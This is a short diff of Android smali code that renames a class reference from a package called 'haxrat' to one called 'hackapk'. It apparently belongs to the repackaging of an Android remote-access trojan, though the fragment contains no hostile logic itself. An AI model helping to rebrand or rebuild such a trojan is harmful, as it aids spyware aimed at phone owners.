@@ -59,7 +59,7 @@
     move-object v3, v12
 
     .line 20
-    invoke-static {}, Lcom/hax4us/haxrat/MainService;->getContextOfApplication()Landroid/content/Context;
+    invoke-static {}, Lcom/justhack/hackapk/MainService;->getContextOfApplication()Landroid/content/Context;
 
     move-result-object v12
 
